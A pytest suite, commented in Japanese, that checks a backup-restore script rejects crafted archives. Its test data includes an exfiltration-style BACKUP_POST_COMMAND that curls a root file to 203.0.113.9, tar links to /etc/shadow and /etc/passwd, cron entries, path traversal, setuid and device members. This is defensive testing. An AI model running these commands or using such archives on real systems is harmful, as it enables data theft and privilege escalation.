"""scripts/restore.sh のテスト（#37・復元の途中の失敗・backup.sh で作ったものを戻せること）

- バックアップは本物の scripts/backup.sh（test_backup_script.py と同じ偽の podman）で作る。以前の版の backup.sh
  （git の履歴にあれば）で作ったものも戻せることを確かめる
- 復元は偽の podman（CONTAINER_CMD）で行う。偽の podman は呼び出しを記録し、pg_restore には標準入力の中身を記録する。
  ボリュームの場所（volume inspect）は一時ディレクトリを返す。偽の sudo・podman-compose（.env を変えたときの作り直し）も使う
- 暗号化は本物の gpg（無ければ飛ばす）。攻撃のシナリオ: gpg --store で包んだだけのもの、暗号化されていない部分を前に足したもの、
  certs.tar・ボリュームの書庫に scripts/backup.sh・絶対パス・..・リンク・デバイスを入れたもの、.env の BACKUP_POST_COMMAND
"""
import functools
import io
import os
import re
import shutil
import subprocess
import tarfile
import tempfile
from pathlib import Path

import pytest
from test_backup_script import FAKE as BACKUP_FAKE

REPO = Path(__file__).resolve().parents[2]
SCRIPTS = REPO / "scripts"
pytestmark = pytest.mark.skipif(shutil.which("bash") is None, reason="bash が必要")
HAS_GPG = shutil.which("gpg") is not None

KEY_A = "Zm9vYmFyYmF6cXV4MDEyMzQ1Njc4OWFiY2RlZmdoaWo="   # バックアップを取ったときの DEVICE_ENCRYPTION_KEY
KEY_B = "YmFyYmF6cXV4Zm9vMDEyMzQ1Njc4OWFiY2RlZmdoaWo="   # 別のサーバー（今の .env）の鍵
ENV_A = f"POSTGRES_PASSWORD=pgA\nSECRET_KEY=secretA\nDEVICE_ENCRYPTION_KEY={KEY_A}\nHTTP_PORT=80\n"
MARK = "Vq7MarkSecret"   # 値の目印（画面に出てはいけない）


@functools.cache
def pair(name):
    """本物の証明書と鍵の組（restore.sh が組になっているかを openssl で確かめるため）"""
    d = Path(tempfile.mkdtemp(prefix="ncm-cert-"))
    subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-days", "1", "-subj", f"/CN={name}.example.test",
                    "-keyout", str(d / "k"), "-out", str(d / "c")], check=True, capture_output=True)
    out = ((d / "c").read_bytes(), (d / "k").read_bytes())
    shutil.rmtree(d)
    return out


CRT_A, KEY_A_PEM = pair("a")
CRT_X, KEY_X_PEM = pair("x")

# 偽の podman（復元用）: 呼び出しを記録する。FAKE_FAIL に「サブコマンド 引数の一部」があれば 1 で失敗する
RESTORE_FAKE = r"""#!/bin/bash
printf 'podman %s\n' "$*" >> "$FAKE_LOG"
IFS='|' read -ra pats <<<"${FAKE_FAIL:-}"
for p in "${pats[@]}"; do [ -n "$p" ] && [[ "$*" == *"$p"* ]] && { echo "fake podman: 失敗させました" >&2; exit 1; }; done
case "$1" in
  ps) for s in db backend worker beat frontend; do [[ "$*" == *"service=$s"* ]] && echo "${s}ct"; done ;;
  start|stop) echo "$2" ;;
  volume) echo "$FAKE_VOLROOT/${*: -1}" ;;
  exec)
    shift; [ "$1" = -i ] && shift; shift
    case "$1" in
      pg_isready) exit 0 ;;
      pg_restore)
        data=$(cat)
        if [[ " $* " == *" -l "* ]]; then [[ "$data" == PGDMP* ]] || exit 1; exit 0; fi
        printf 'pg_restore-stdin %s\n' "$data" >> "$FAKE_LOG"
        [ -z "${FAKE_PGRESTORE_FAIL:-}" ] || exit 1 ;;
      psql) data=$(cat 2>/dev/null || true); printf 'psql-stdin %s\n' "$data" >> "$FAKE_LOG" ;;
    esac ;;
esac
exit 0
"""
SUDO = r"""#!/bin/bash
printf 'sudo %s\n' "$*" >> "$FAKE_LOG"
while [[ "${1:-}" == -* ]]; do case "$1" in -u) shift 2 ;; *) shift ;; esac; done
exec "$@"
"""
# 偽の podman-compose: 受け取ったプロキシの環境変数と引数を記録し、秘密の値を含む行を出す（伏せ字の確認）
COMPOSE = r"""#!/bin/bash
printf 'podman-compose %s https_proxy=%s\n' "$*" "${https_proxy:-}" >> "$FAKE_LOG"
[ -z "${FAKE_COMPOSE_FAIL:-}" ] || { echo "fake podman-compose: 失敗させました" >&2; exit 1; }
echo "podman run --name=ncm_backend_1 -d -e SECRET_KEY=sk$FAKE_MARK -e OUTBOUND_PROXY=http://u:p$FAKE_MARK@proxy.example.test:3128 image"
"""


def stub(p, text):
    p.write_text(text)
    p.chmod(0o755)


class Env:
    def __init__(self, tmp: Path):
        self.tmp = tmp
        self.install = tmp / "install"
        (self.install / "certs").mkdir(parents=True)
        shutil.copytree(SCRIPTS, self.install / "scripts", ignore=shutil.ignore_patterns("__pycache__"))
        self.env_file = self.install / ".env"
        self.env_file.write_text(ENV_A)
        self.env_file.chmod(0o600)
        (self.install / "certs" / "server.crt").write_bytes(CRT_A)
        (self.install / "certs" / "server.key").write_bytes(KEY_A_PEM)
        (self.install / "certs" / "README.md").write_text("readme\n")
        self.bin = tmp / "bin"
        self.bin.mkdir()
        # バックアップ用の偽の podman（test_backup_script.py と同じ）。ボリュームの中身は src/ から
        stub(self.bin / "backup-podman", BACKUP_FAKE)
        self.src = tmp / "src"
        (self.src / "dev1").mkdir(parents=True)
        (self.src / "dev1" / "running.txt").write_text("hostname r1\n")
        # 復元用（名前は podman: restore.sh は podman のときに podman-compose で作り直す）
        rdir = tmp / "rbin"
        rdir.mkdir()
        self.podman = rdir / "podman"
        stub(self.podman, RESTORE_FAKE)
        stub(rdir / "sudo", SUDO)
        stub(rdir / "podman-compose", COMPOSE)
        self.rbin = rdir
        self.vol = tmp / "volumes"
        for v in ("config_repo", "ssh_data", "terminal_logs"):
            (self.vol / f"ncm_{v}").mkdir(parents=True)
            (self.vol / f"ncm_{v}" / "old.txt").write_text("old")
        self.backups = tmp / "backups"
        self.rootbackup = tmp / "rootbackup"
        self.log = tmp / "calls.log"
        self.log.write_text("")
        self.gnupg = tempfile.mkdtemp(prefix="g")   # gpg-agent のソケットのパスが長すぎないよう短い場所
        self.pw = tmp / "backup.pass"
        self.pw.write_text("test-passphrase-123\n")
        self.pw.chmod(0o600)

    def base_env(self, **extra):
        e = {k: v for k, v in os.environ.items()
             if k not in ("http_proxy", "https_proxy", "HTTP_PROXY", "HTTPS_PROXY", "no_proxy", "NO_PROXY",
                          "BACKUP_ENCRYPT_PASSPHRASE_FILE", "RESTORE_YES", "RESTORE_ENV")}
        e.update(INSTALL_DIR=str(self.install), PROJECT_NAME="ncm", FAKE_LOG=str(self.log), LC_ALL="C.UTF-8")
        e.update({k: v for k, v in extra.items() if v is not None})
        return {k: v for k, v in e.items() if v is not None}

    def backup(self, script=None, **extra):
        e = self.base_env(CONTAINER_CMD=str(self.bin / "backup-podman"), BACKUP_DIR=str(self.backups),
                          BACKUP_WORK_DIR=str(self.tmp / "bwork"), FAKE_EMPTY=str(self.src), FAKE_DOWN="", FAKE_PGFAIL="",
                          **extra)
        r = subprocess.run(["bash", str(script or self.install / "scripts" / "backup.sh")], env=e, capture_output=True,
                           text=True, timeout=60)
        assert r.returncode == 0, r.stdout + r.stderr
        files = sorted(self.backups.glob("netconfig-backup-*"), key=lambda p: p.stat().st_mtime)
        return files[-1]

    def restore(self, file, stdin="", **extra):
        self.log.write_text("")
        extra.setdefault("RESTORE_YES", "1")
        e = self.base_env(CONTAINER_CMD=str(self.podman), ENV_BACKUP_DIR=str(self.rootbackup),
                          RESTORE_WORK_DIR=str(self.tmp / "rwork"), FAKE_VOLROOT=str(self.vol), FAKE_MARK=MARK,
                          PATH=f"{self.rbin}:{os.environ['PATH']}", GNUPGHOME=self.gnupg, **extra)
        (self.tmp / "rwork").mkdir(exist_ok=True)
        return subprocess.run(["bash", str(self.install / "scripts" / "restore.sh"), str(file)], env=e, input=stdin,
                              capture_output=True, text=True, timeout=120)

    def calls(self):
        return self.log.read_text().splitlines()

    def changed_anything(self):
        """アプリの停止・DB の操作のどれかを呼んだか（検査で止まったときは、どれも呼ばない）"""
        return [c for c in self.calls() if c.startswith(("podman stop", "podman exec dbct psql", "psql-stdin", "pg_restore-stdin"))
                or (c.startswith("podman exec") and "pg_restore -U" in c)]

    def gpg(self, *args, data=None):
        return subprocess.run(["gpg", "--homedir", self.gnupg, "--batch", "--yes", "--quiet", "--pinentry-mode", "loopback", *args],
                              input=data, capture_output=True, timeout=60)

    def cleanup(self):
        subprocess.run(["gpgconf", "--homedir", self.gnupg, "--kill", "gpg-agent"], capture_output=True)
        shutil.rmtree(self.gnupg, ignore_errors=True)


@pytest.fixture
def ev(tmp_path):
    e = Env(tmp_path)
    yield e
    e.cleanup()


def make_archive(path: Path, members: dict, extra=None):
    """バックアップと同じ形（./ で始まる名前の tar.gz）を作る。members: 名前 → bytes。extra: 追加の TarInfo と中身"""
    with tarfile.open(path, "w:gz") as t:
        d = tarfile.TarInfo("./")
        d.type = tarfile.DIRTYPE
        d.mode = 0o700
        t.addfile(d)
        for name, data in members.items():
            info = tarfile.TarInfo(f"./{name}")
            info.size = len(data)
            info.mode = 0o600
            t.addfile(info, io.BytesIO(data))
        for info, data in extra or []:
            t.addfile(info, io.BytesIO(data) if data is not None else None)
    return path


def inner_tar(entries):
    """書庫の中の書庫（certs.tar など）。entries: (TarInfo, bytes or None)"""
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w") as t:
        for info, data in entries:
            if data is not None:
                info.size = len(data)
            t.addfile(info, io.BytesIO(data) if data is not None else None)
    return buf.getvalue()


def reg(name, data=b"x", mode=0o644):
    i = tarfile.TarInfo(name)
    i.mode = mode
    return i, data


def link(name, target, kind=tarfile.SYMTYPE):
    i = tarfile.TarInfo(name)
    i.type = kind
    i.linkname = target
    return i, None


def base_members(**over):
    m = {"manifest.txt": b"NetConfig Manager backup\n", "db.dump": b"PGDMP fake dump\n",
         "configs.tar": inner_tar([reg("./dev1/running.txt", b"hostname r9\n")]), "env": ENV_A.encode(),
         "certs.tar": inner_tar([reg("certs/server.crt", CRT_X), reg("certs/server.key", KEY_X_PEM, 0o600)])}
    m.update(over)
    return {k: v for k, v in m.items() if v is not None}


# ------------------------------------------------------------------ 今の backup.sh で作ったものを戻す
def test_plain_backup_roundtrip(ev):
    f = ev.backup()
    (ev.install / "certs" / "server.crt").write_text("CRT-NEW\n")   # バックアップのあとに変わったもの
    r = ev.restore(f)
    assert r.returncode == 0, r.stdout + r.stderr
    assert "暗号化されていないバックアップです" in r.stdout and "復元が完了しました" in r.stdout
    calls = ev.calls()
    assert "pg_restore-stdin PGDMP fake dump" in calls
    # 順序: 停止 → DB → 起動（いつも作り直す。.env は同じ鍵なので変えない）
    stop = next(i for i, c in enumerate(calls) if c.startswith("podman stop"))
    drop = next(i for i, c in enumerate(calls) if "DROP DATABASE" in c)
    up = [i for i, c in enumerate(calls) if c.startswith("podman-compose")]
    assert len(up) == 1 and stop < drop < up[0]
    assert calls[up[0]].startswith("podman-compose -f docker-compose.prod.yml up -d --force-recreate")
    # ボリュームはバックアップの中身に入れ替わる
    assert (ev.vol / "ncm_config_repo" / "dev1" / "running.txt").read_text() == "hostname r1\n"
    assert not (ev.vol / "ncm_config_repo" / "old.txt").exists()
    # 証明書は戻り、元の証明書・.env の控えがある（600 / 700）
    assert (ev.install / "certs" / "server.crt").read_bytes() == CRT_A
    assert (ev.install / "certs" / "server.key").stat().st_mode & 0o777 == 0o600
    [saved_env] = list(ev.rootbackup.glob("env-before-restore-*"))
    assert saved_env.read_text() == ENV_A and saved_env.stat().st_mode & 0o777 == 0o600
    [saved_certs] = list(ev.rootbackup.glob("certs-before-restore-*"))
    assert (saved_certs / "server.crt").read_text() == "CRT-NEW\n" and saved_certs.stat().st_mode & 0o777 == 0o700
    assert ev.env_file.read_text() == ENV_A
    assert not list((ev.tmp / "rwork").iterdir())  # 作業用のディレクトリは消える


@pytest.mark.skipif(not HAS_GPG, reason="gpg が必要")
def test_encrypted_backup_roundtrip(ev):
    f = ev.backup(BACKUP_ENCRYPT_PASSPHRASE_FILE=str(ev.pw))
    assert f.name.endswith(".tar.gz.gpg")
    r = ev.restore(f, BACKUP_ENCRYPT_PASSPHRASE_FILE=str(ev.pw))
    assert r.returncode == 0, r.stdout + r.stderr
    assert "暗号化されたバックアップです" in r.stdout and "pg_restore-stdin PGDMP fake dump" in ev.calls()
    # パスフレーズは .env の BACKUP_ENCRYPT_PASSPHRASE_FILE からも読む
    ev.env_file.write_text(ENV_A + f"BACKUP_ENCRYPT_PASSPHRASE_FILE={ev.pw}\n")
    r = ev.restore(f)
    assert r.returncode == 0, r.stdout + r.stderr
    # 違うパスフレーズ
    bad = ev.tmp / "bad.pass"
    bad.write_text("wrong")
    r = ev.restore(f, BACKUP_ENCRYPT_PASSPHRASE_FILE=str(bad))
    assert r.returncode == 1 and "復号できませんでした" in r.stdout and not ev.changed_anything()


@pytest.mark.parametrize("rev", ["9f8624b", "797c57c", "d678eba", "5c286bc"])
def test_backups_made_by_older_backup_sh_can_be_restored(ev, rev):
    """以前の版の backup.sh（git の履歴から取り出す）で作ったものも、今までどおり戻せる"""
    old = subprocess.run(["git", "-C", str(REPO), "show", f"{rev}:scripts/backup.sh"], capture_output=True, text=True)
    if old.returncode != 0:
        pytest.skip(f"git の履歴に {rev} がありません（浅い clone）")
    script = ev.install / "scripts" / f"backup-{rev}.sh"
    script.write_text(old.stdout)
    extra = {}
    if rev in ("d678eba", "5c286bc") and HAS_GPG:
        extra["BACKUP_ENCRYPT_PASSPHRASE_FILE"] = str(ev.pw)
    f = ev.backup(script=script, **extra)
    r = ev.restore(f, **extra)
    assert r.returncode == 0, r.stdout + r.stderr
    assert "pg_restore-stdin PGDMP fake dump" in ev.calls()
    assert (ev.vol / "ncm_config_repo" / "dev1" / "running.txt").read_text() == "hostname r1\n"


# ------------------------------------------------------------------ #37: 暗号化されていない OpenPGP のデータ
@pytest.mark.skipif(not HAS_GPG, reason="gpg が必要")
def test_store_wrapped_archive_is_rejected(ev):
    """gpg --store で包んだだけのもの（パスフレーズと関係なく展開でき、終了コードは 0）は受け付けない"""
    plain = make_archive(ev.tmp / "fake.tar.gz", base_members(env=(ENV_A.replace(KEY_A, KEY_B) + f"BACKUP_POST_COMMAND=touch {ev.tmp}/pwned\n").encode()))
    fake = ev.tmp / "netconfig-backup-20990101-000000.tar.gz.gpg"
    assert ev.gpg("--store", "-o", str(fake), str(plain)).returncode == 0
    r = ev.restore(fake, BACKUP_ENCRYPT_PASSPHRASE_FILE=str(ev.pw), RESTORE_ENV="all")
    assert r.returncode == 1 and "パスフレーズで暗号化されたバックアップではありません" in r.stdout, r.stdout + r.stderr
    assert not ev.changed_anything() and ev.env_file.read_text() == ENV_A
    assert (ev.install / "certs" / "server.crt").read_bytes() == CRT_A


@pytest.mark.skipif(not HAS_GPG, reason="gpg が必要")
def test_unencrypted_part_prepended_to_real_backup_is_rejected(ev):
    """本物の暗号化したバックアップの前に、暗号化されていない中身を足したもの（gpg は前の中身だけを出して 0 で終わる）"""
    real = ev.backup(BACKUP_ENCRYPT_PASSPHRASE_FILE=str(ev.pw))
    plain = make_archive(ev.tmp / "fake.tar.gz", base_members())
    stored = ev.tmp / "stored.gpg"
    assert ev.gpg("--store", "-o", str(stored), str(plain)).returncode == 0
    mixed = ev.tmp / "netconfig-backup-20990101-000001.tar.gz.gpg"
    mixed.write_bytes(stored.read_bytes() + real.read_bytes())
    r = ev.restore(mixed, BACKUP_ENCRYPT_PASSPHRASE_FILE=str(ev.pw))
    assert r.returncode == 1 and not ev.changed_anything(), r.stdout + r.stderr
    # 後ろに足したもの（gpg が失敗する）
    mixed.write_bytes(real.read_bytes() + stored.read_bytes())
    r = ev.restore(mixed, BACKUP_ENCRYPT_PASSPHRASE_FILE=str(ev.pw))
    assert r.returncode == 1 and not ev.changed_anything(), r.stdout + r.stderr


def test_unencrypted_backup_on_encrypted_environment_needs_explicit_ok(ev):
    f = ev.backup()
    ev.env_file.write_text(ENV_A + f"BACKUP_ENCRYPT_PASSPHRASE_FILE={ev.pw}\n")
    r = ev.restore(f)
    assert r.returncode == 1 and "RESTORE_ALLOW_UNENCRYPTED=1" in r.stdout and not ev.changed_anything()
    r = ev.restore(f, RESTORE_ALLOW_UNENCRYPTED="1")
    assert r.returncode == 0, r.stdout + r.stderr
    assert "このファイルは暗号化されていません" in r.stdout
    # 対話（yes を入力）なら、注意を表示して yes で確かめる
    r = ev.restore(f, stdin="yes\n", RESTORE_YES=None)
    assert r.returncode == 0 and "このファイルは暗号化されていません" in r.stdout


# ------------------------------------------------------------------ #37: 書庫の中身の検査（何も変えずに止める）
@pytest.mark.parametrize("certs", [
    [link("certs/server.crt", "/etc/passwd")],                       # 証明書がシンボリックリンク
    [reg("/etc/cron.d/x", b"* * * * * root id\n")],                    # 絶対パス
    [reg("certs/../../scripts/backup.sh", b"#!/bin/bash\nid\n")],      # ..
    [link("certs/server.key", "../.env", tarfile.LNKTYPE)],            # ハードリンク（.. のリンク先）
])
def test_bad_certs_archive_stops_before_any_change(ev, certs):
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"certs.tar": inner_tar(certs)}))
    r = ev.restore(f)
    assert r.returncode == 1, r.stdout + r.stderr
    assert "certs.tar" in r.stdout and "何も変えていません" in r.stdout
    assert not ev.changed_anything()
    assert (ev.install / "certs" / "server.crt").read_bytes() == CRT_A


def test_certs_archive_only_restores_the_three_certificate_files(ev):
    """Issue のシナリオ: certs.tar に scripts/backup.sh を入れても、certs/ の server.crt・server.key・ca.crt しか戻さない"""
    original = (ev.install / "scripts" / "backup.sh").read_bytes()
    certs = inner_tar([reg("certs/server.crt", CRT_X), reg("certs/server.key", KEY_X_PEM), reg("certs/ca.crt", b"CA-X\n"),
                       reg("scripts/backup.sh", b"#!/bin/bash\ntouch /tmp/pwned\n", 0o755), reg("certs/extra.sh", b"x"),
                       link("certs/other", "/etc/shadow")])
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"certs.tar": certs}))
    r = ev.restore(f)
    # certs/other（関係の無い名前のリンク）は使わないが、/etc を指すリンクなので書庫ごと止める
    assert r.returncode == 1 and not ev.changed_anything()
    certs = inner_tar([reg("certs/server.crt", CRT_X), reg("certs/server.key", KEY_X_PEM), reg("certs/ca.crt", b"CA-X\n"),
                       reg("scripts/backup.sh", b"#!/bin/bash\ntouch /tmp/pwned\n", 0o755), reg("certs/extra.sh", b"x")])
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000001.tar.gz", base_members(**{"certs.tar": certs}))
    r = ev.restore(f)
    assert r.returncode == 0, r.stdout + r.stderr
    assert (ev.install / "scripts" / "backup.sh").read_bytes() == original
    assert not (ev.install / "certs" / "extra.sh").exists() and not (ev.install / "scripts" / "backup.sh.orig").exists()
    assert (ev.install / "certs" / "server.crt").read_bytes() == CRT_X
    assert (ev.install / "certs" / "ca.crt").stat().st_mode & 0o777 == 0o644
    assert (ev.install / "certs" / "server.key").stat().st_mode & 0o777 == 0o600


def _dev():
    i = tarfile.TarInfo("./dev1/null")
    i.type = tarfile.CHRTYPE
    i.devmajor, i.devminor = 1, 3
    return i, None


@pytest.mark.parametrize("entries", [
    [link("./etc", "/etc"), reg("./etc/cron.d/x", b"* * * * * root id\n")],   # ホストの /etc へのリンク
    [link("./up", "../../../../etc")],                                       # .. のリンク
    [reg("./../outside.txt")],                                               # ..
    [_dev()],                                                                # デバイス
    [reg("./bin/sh-root", b"x", 0o4755)],                                    # setuid
])
def test_bad_volume_archive_stops_before_any_change(ev, entries):
    """ボリュームの書庫はホストの root で展開するので、リンク・デバイスなどを含むものは止める"""
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"configs.tar": inner_tar(entries)}))
    r = ev.restore(f)
    assert r.returncode == 1 and "configs.tar" in r.stdout and "何も変えていません" in r.stdout, r.stdout + r.stderr
    assert not ev.changed_anything() and (ev.vol / "ncm_config_repo" / "old.txt").exists()


def test_volume_archive_with_safe_links_is_restored(ev):
    """書庫の中を指すリンク（相対で .. を含まない）は通す"""
    entries = [reg("./dev1/running.txt", b"r1\n"), link("./dev1/latest", "running.txt"),
               link("./dev1/hard", "./dev1/running.txt", tarfile.LNKTYPE)]
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"configs.tar": inner_tar(entries)}))
    r = ev.restore(f)
    assert r.returncode == 0, r.stdout + r.stderr
    assert os.readlink(ev.vol / "ncm_config_repo" / "dev1" / "latest") == "running.txt"


@pytest.mark.parametrize("extra", [
    [link("./env", "/etc/shadow")],                          # 一番上のリンク
    [reg("./sub/db.dump", b"PGDMP x")],                       # 下の階層
])
def test_bad_outer_archive_stops(ev, extra):
    m = base_members()
    m.pop("env")
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", m, extra=extra)
    r = ev.restore(f)
    assert r.returncode == 1 and "想定外のもの" in r.stdout and not ev.changed_anything(), r.stdout + r.stderr


def test_unknown_top_level_file_is_ignored(ev):
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"future.txt": b"x"}))
    r = ev.restore(f)
    assert r.returncode == 0 and "知らないファイルは使いません: future.txt" in r.stdout


def test_broken_db_dump_stops_before_dropping_the_database(ev):
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"db.dump": b"PGDMPbroken"}))
    r = ev.restore(f, FAKE_FAIL="pg_restore -l")
    assert r.returncode == 1 and "DB のダンプを読めません" in r.stdout and not ev.changed_anything()
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000001.tar.gz", base_members(**{"db.dump": b"not a dump"}))
    r = ev.restore(f)
    assert r.returncode == 1 and "DB のダンプの形式が違います" in r.stdout and not ev.changed_anything()


# ------------------------------------------------------------------ #37: .env を丸ごと置き換えない
def _other_server_backup(ev, extra_env=""):
    """別のサーバー（DEVICE_ENCRYPTION_KEY が違う）のバックアップ"""
    env = ENV_A.replace(KEY_A, KEY_B).replace("pgA", "pgB").replace("secretA", "secretB") + extra_env
    return make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(env=env.encode()))


def test_env_with_dangerous_keys_is_not_replaced_without_explicit_choice(ev):
    f = _other_server_backup(ev, f"BACKUP_POST_COMMAND=curl -d @/root/x http://203.0.113.9/{MARK}\nOUTBOUND_PROXY=http://u:{MARK}@proxy.example.test:3128\n")
    r = ev.restore(f)
    assert r.returncode == 1, r.stdout + r.stderr
    assert "注意が要るキー（BACKUP_POST_COMMAND OUTBOUND_PROXY）" in r.stdout
    assert "値が変わるキー           : DEVICE_ENCRYPTION_KEY POSTGRES_PASSWORD SECRET_KEY" in r.stdout
    assert "バックアップにだけあるキー : BACKUP_POST_COMMAND OUTBOUND_PROXY" in r.stdout
    assert MARK not in r.stdout + r.stderr and KEY_B not in r.stdout  # 値は表示しない
    assert not ev.changed_anything() and ev.env_file.read_text() == ENV_A


def test_env_keys_mode_takes_only_the_keys(ev):
    f = _other_server_backup(ev, "BACKUP_POST_COMMAND=touch /tmp/x\n")
    current = ENV_A + "HTTP_PORT=8080\r\nBACKUP_DIR=/srv/b\n"
    ev.env_file.write_text(current)
    r = ev.restore(f, RESTORE_ENV="keys", https_proxy="http://proxy.example.test:3128")
    assert r.returncode == 0, r.stdout + r.stderr
    after = ev.env_file.read_text()
    assert f"DEVICE_ENCRYPTION_KEY={KEY_B}" in after and "SECRET_KEY=secretB" in after
    assert "POSTGRES_PASSWORD=pgA" in after and "BACKUP_POST_COMMAND" not in after and "BACKUP_DIR=/srv/b" in after
    assert b"HTTP_PORT=8080\r\n" in ev.env_file.read_bytes()  # ほかの行はそのまま（CR も）
    assert ev.env_file.stat().st_mode & 0o777 == 0o600
    # DB のパスワードはこれから使う .env（今の pgA）に合わせる。作り直しはプロキシを渡さず、出力は伏せ字
    assert "psql-stdin ALTER USER netconfig PASSWORD 'pgA';" in ev.calls()
    up = [c for c in ev.calls() if c.startswith("podman-compose")]
    assert up == ["podman-compose -f docker-compose.prod.yml up -d --force-recreate https_proxy="]
    assert "SECRET_KEY=***" in r.stdout and MARK not in r.stdout
    [saved] = list(ev.rootbackup.glob("env-before-restore-*"))
    assert saved.read_bytes() == current.encode()


def test_env_all_mode_replaces_like_before(ev):
    """all（別のサーバーへ移すとき。以前からの動き）。注意が要るキーが変わらなければ RESTORE_YES=1 だけで丸ごと戻す"""
    f = _other_server_backup(ev)
    r = ev.restore(f)
    assert r.returncode == 0, r.stdout + r.stderr
    assert ev.env_file.read_text() == ENV_A.replace(KEY_A, KEY_B).replace("pgA", "pgB").replace("secretA", "secretB")
    assert "psql-stdin ALTER USER netconfig PASSWORD 'pgB';" in ev.calls()
    # 注意が要るキーが変わる場合も、RESTORE_ENV=all なら丸ごと戻す
    f = _other_server_backup(ev, "BACKUP_POST_COMMAND=true\n")
    ev.env_file.write_text(ENV_A)
    r = ev.restore(f, RESTORE_ENV="all")
    assert r.returncode == 0 and "BACKUP_POST_COMMAND=true" in ev.env_file.read_text()


def test_env_choice_is_asked_interactively(ev):
    f = _other_server_backup(ev, "BACKUP_POST_COMMAND=true\n")
    r = ev.restore(f, stdin="keys\nyes\n", RESTORE_YES=None)
    assert r.returncode == 0, r.stdout + r.stderr
    assert "BACKUP_POST_COMMAND" not in ev.env_file.read_text() and f"DEVICE_ENCRYPTION_KEY={KEY_B}" in ev.env_file.read_text()
    ev.env_file.write_text(ENV_A)
    r = ev.restore(f, stdin="no\n", RESTORE_YES=None)
    assert r.returncode == 1 and "中止しました（何も変えていません）" in r.stdout and not ev.changed_anything()


# ------------------------------------------------------------------ 途中で失敗したときの案内
def test_failure_after_dropping_the_database_explains_state_and_recovery(ev):
    f = _other_server_backup(ev)
    r = ev.restore(f, FAKE_PGRESTORE_FAIL="1")
    assert r.returncode != 0
    out = r.stdout
    assert "復元は「DB のダンプの流し込み」で失敗しました" in out
    assert "アプリ（backend・worker・beat・frontend）: 止まっています" in out
    assert "DB: 空か、流し込みの途中です" in out
    assert ".env: 変えていません" in out   # .env は DB・ボリューム・証明書のあとに変えるので、ここでは元のまま
    assert "このまま起動しないでください" in out and f"restore.sh {f}" in out and "backup.sh --list" in out
    assert "install -m 600" not in out      # .env を控えに戻す案内は出さない（.env は変えていない）
    [saved] = list(ev.rootbackup.glob("env-before-restore-*"))
    assert str(saved) in out
    assert ev.env_file.read_text() == ENV_A
    # 同じバックアップでもう一度復元すれば直る
    r = ev.restore(f)
    assert r.returncode == 0, r.stdout + r.stderr


def test_env_and_certs_backup_failure_stops_before_any_change(ev):
    ev.rootbackup.write_text("ファイルなのでディレクトリを作れない")
    f = ev.backup()
    r = ev.restore(f)
    assert r.returncode == 1 and "控えの置き場" in r.stdout and not ev.changed_anything()


# ------------------------------------------------------------------ 失敗した段階ごとの案内と、もう一度の復元で直ること
def test_failure_while_stopping_says_nothing_changed(ev):
    f = ev.backup()
    r = ev.restore(f, FAKE_FAIL="stop workerct")
    assert r.returncode != 0
    assert "データ（DB・ボリューム・証明書・.env）はまだ変えていません" in r.stdout and "up -d --force-recreate" in r.stdout
    assert not [c for c in ev.calls() if "DROP DATABASE" in c]


def test_failure_after_env_was_changed_says_use_force_recreate_not_old_env(ev):
    """DB のパスワードを変えた後・起動の段階での失敗: 「.env を控えに戻す」は DB も別のバックアップで戻すときだけ、と案内する。
    もう一度復元すると（鍵は同じになっているが）いつも作り直すので直る"""
    f = _other_server_backup(ev)
    r = ev.restore(f, FAKE_COMPOSE_FAIL="1")
    assert r.returncode != 0
    out = r.stdout
    assert "復元は「アプリの起動」で失敗しました" in out
    assert "up -d --force-recreate" in out and "setup.sh" in out
    assert "DB も別のバックアップで戻すときだけ" in out
    assert f"DEVICE_ENCRYPTION_KEY={KEY_B}" in ev.env_file.read_text()
    r = ev.restore(f)   # 2 回目: 鍵は同じなので .env は変えないが、作り直して起動する
    assert r.returncode == 0, r.stdout + r.stderr
    assert [c for c in ev.calls() if c.startswith("podman-compose -f docker-compose.prod.yml up -d --force-recreate")]
    # DB のパスワードを変える段階での失敗も、同じ案内
    ev.env_file.write_text(ENV_A)
    r = ev.restore(f, FAKE_FAIL="exec -i dbct psql")
    assert r.returncode != 0 and "復元は「DB のパスワードの設定」で失敗しました" in r.stdout
    assert "もう一度同じバックアップで復元する" in r.stdout and "このまま起動しないでください" in r.stdout
    r = ev.restore(f, RESTORE_ENV="all")
    assert r.returncode == 0, r.stdout + r.stderr


# ------------------------------------------------------------------ 書庫を最後まで読めること・ハードリンク・大きさ
def test_truncated_volume_archive_stops_before_any_change(ev):
    data = inner_tar([reg("./dev1/running.txt", b"x" * 20000), reg("./dev1/b.txt", b"y" * 20000)])
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"configs.tar": data[:15000]}))
    r = ev.restore(f)
    assert r.returncode == 1 and "configs.tar を最後まで読めません" in r.stdout and "何も変えていません" in r.stdout, r.stdout
    assert not ev.changed_anything() and (ev.vol / "ncm_config_repo" / "old.txt").exists()


@pytest.mark.parametrize("target", ["/etc/shadow", "./not-in-archive.txt"])
def test_hardlink_outside_the_archive_stops(ev, target):
    entries = [reg("./dev1/running.txt", b"r1\n"), link("./dev1/h", target, tarfile.LNKTYPE)]
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"configs.tar": inner_tar(entries)}))
    r = ev.restore(f)
    assert r.returncode == 1 and "書庫の外を指すハードリンク" in r.stdout and not ev.changed_anything(), r.stdout


def test_archive_larger_than_the_limit_stops(ev):
    """圧縮爆弾: 展開しながら数え、上限（RESTORE_MAX_BYTES・既定は作業場所の空きの 9 割）を超えたら止める"""
    f = make_archive(ev.tmp / "netconfig-backup-20990101-000000.tar.gz", base_members(**{"future.bin": b"\0" * 3_000_000}))
    assert f.stat().st_size < 100_000
    r = ev.restore(f, RESTORE_MAX_BYTES="1000000")
